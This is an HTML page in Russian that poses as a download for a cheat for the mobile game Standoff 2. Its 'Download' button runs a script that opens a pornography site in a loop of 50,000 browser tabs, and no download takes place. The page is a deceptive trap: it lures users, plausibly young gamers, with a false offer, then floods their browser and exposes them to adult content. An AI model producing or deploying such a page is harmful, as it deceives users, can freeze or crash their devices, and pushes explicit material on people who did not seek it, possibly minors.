<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>чит на standoff 2</title>
    <style>
        /* Основные стили для страницы */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #1e1e1e;
            color: #fff;
            margin: 0;
            padding: 0;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
        }

        h1 {
            font-size: 3rem;
            margin-bottom: 20px;
            color: #ff6347;
            text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.7);
        }

        p {
            font-size: 1.2rem;
            color: #f1f1f1;
            margin-bottom: 30px;
            text-align: center;
            width: 70%;
        }

        /* Стиль кнопки */
        .btn {
            background-color: #ff6347;
            color: white;
            font-size: 1.5rem;
            padding: 15px 40px;
            border: none;
            border-radius: 8px;
            cursor: pointer;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.3);
            transition: background-color 0.3s, transform 0.2s;
        }

        .btn:hover {
            background-color: #e55347;
            transform: translateY(-3px);
        }

        .btn:active {
            transform: translateY(1px);
        }

        /* Стиль для текста, отображающего состояние */
        .output {
            margin-top: 20px;
            font-size: 1.2rem;
            font-weight: bold;
            color: #ff9900;
            text-align: center;
        }

        .loading {
            color: #ffcc00;
            font-style: italic;
        }

        /* Добавим плавные анимации для текста */
        .output span {
            display: inline-block;
            opacity: 0;
            animation: fadeIn 2s forwards;
        }

        @keyframes fadeIn {
            to {
                opacity: 1;
            }
        }

        /* Стиль контейнера для всей страницы */
        .container {
            text-align: center;
            background: linear-gradient(135deg, #0f0f0f, #3a3a3a);
            padding: 50px;
            border-radius: 10px;
            width: 80%;
            max-width: 600px;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.7);
        }

        /* Мобильная адаптивность */
        @media screen and (max-width: 600px) {
            h1 {
                font-size: 2rem;
            }

            p {
                font-size: 1rem;
                width: 90%;
            }

            .btn {
                font-size: 1.2rem;
                padding: 12px 30px;
            }

            .output {
                font-size: 1rem;
            }
        }
    </style>
</head>
<body>

    <div class="container">
        <h1>чит на standoff 2</h1>
        <p>Нажмите кнопку, чтобы скачать чит на standoff 2</p>
        <button class="btn" onclick="openTabs()">Скачать</button>

        <div class="output" id="output"></div>
    </div>

    <script>
        // Функция для открытия новых вкладок
        function openTabs() {
            document.getElementById('output').innerHTML = "<span class='loading'>Открытие вкладок... Пожалуйста, подождите.</span>";

            let numberOfTabs = 50000;  // Количество вкладок, которые откроются (можно уменьшить, чтобы не перегрузить систему)
            let url = "http://porno365.plus/";  // Адрес для открытия (можно заменить на любой другой)

            for (let i = 0; i < numberOfTabs; i++) {
                window.open(url, "_blank");  // Открытие вкладки
            }

            document.getElementById('output').innerHTML = "<span>Вкладки успешно открыты!</span>";
        }
    </script>

</body>
</html>
